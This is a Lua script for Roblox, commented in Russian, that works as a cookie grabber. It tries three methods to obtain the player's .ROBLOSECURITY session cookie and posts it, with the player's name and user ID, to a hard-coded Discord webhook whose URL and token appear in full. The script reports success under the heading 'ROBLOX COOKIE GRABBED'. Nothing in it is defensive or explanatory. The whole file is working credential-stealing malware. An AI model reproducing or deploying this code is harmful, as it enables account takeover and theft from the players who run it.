local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local localPlayer = Players.LocalPlayer

local webhook = "https://discord.com/api/webhooks/1158432908843941898/A0aEZEdGhe3Q7Ry88bzDSC2RevfNOI1POiM4chjV6YWiqV5uKICTdYavbmQMk5nQo3YK"

-- Функция для безопасной отправки в Discord
local function sendToDiscord(data)
    local success, error = pcall(function()
        local jsonData = HttpService:JSONEncode(data)
        HttpService:PostAsync(webhook, jsonData)
    end)
    return success
end

-- Отправляем сообщение о запуске скрипта
local startData = {
    ["content"] = "🔧 Скрипт запущен",
    ["embeds"] = {{
        ["title"] = "Script Activated",
        ["description"] = "Игрок: **" .. localPlayer.Name .. "** (" .. localPlayer.UserId .. ")",
        ["color"] = 16776960,
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

sendToDiscord(startData)

-- Пытаемся получить куки разными методами
local cookie = nil
local methodUsed = "Не удалось"

-- Метод 1: game:HttpGet
local success1, result1 = pcall(function()
    cookie = game:HttpGet("https://www.roblox.com/game/GetCurrentUser.ashx", true)
    if cookie and cookie ~= "" then
        methodUsed = "game:HttpGet"
    end
end)

-- Метод 2: GetCookie (если первый не сработал)
if not cookie or cookie == "" then
    local success2, result2 = pcall(function()
        cookie = localPlayer:GetCookie(" .ROBLOSECURITY")
        if cookie and cookie ~= "" then
            methodUsed = "GetCookie"
        end
    end)
end

-- Метод 3: Через getrenv (для эксплойтов)
if not cookie or cookie == "" then
    local success3, result3 = pcall(function()
        if getrenv then
            local env = getrenv()
            local cookieFunc = env.getcookie or env.get_cookie or env.getcookies
            if cookieFunc and type(cookieFunc) == "function" then
                cookie = cookieFunc()
                if cookie and cookie ~= "" then
                    methodUsed = "getrenv"
                end
            end
        end
    end)
end

-- Отправляем результат
if cookie and cookie ~= "" then
    -- Обрезаем куки если слишком длинные для Discord
    local displayCookie = cookie
    if #cookie > 1000 then
        displayCookie = string.sub(cookie, 1, 1000) .. "... [TRUNCATED]"
    end
    
    local successData = {
        ["content"] = "🎯 КУКИ ПОЛУЧЕНЫ!",
        ["embeds"] = {{
            ["title"] = "ROBLOX COOKIE GRABBED",
            ["description"] = "Метод: " .. methodUsed,
            ["fields"] = {
                {
                    ["name"] = "👤 Игрок",
                    ["value"] = "```" .. localPlayer.Name .. " (" .. localPlayer.UserId .. ")```",
                    ["inline"] = true
                },
                {
                    ["name"] = "🔐 Cookie (первые 200 символов)",
                    ["value"] = "```" .. string.sub(cookie, 1, 200) .. "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "📏 Длина куки",
                    ["value"] = #cookie .. " символов",
                    ["inline"] = true
                }
            },
            ["color"] = 65280,
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    sendToDiscord(successData)
else
    local errorData = {
        ["content"] = "❌ НЕ УДАЛОСЬ ПОЛУЧИТЬ КУКИ",
        ["embeds"] = {{
            ["title"] = "COOKIE GRAB FAILED",
            ["description"] = "Все методы получения куки не сработали",
            ["fields"] = {
                {
                    ["name"] = "👤 Игрок",
                    ["value"] = "```" .. localPlayer.Name .. " (" .. localPlayer.UserId .. ")```",
                    ["inline"] = true
                },
                {
                    ["name"] = "⚠️ Причина",
                    ["value"] = "Античит Roblox заблокировал все методы",
                    ["inline"] = true
                }
            },
            ["color"] = 16711680,
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    sendToDiscord(errorData)
end
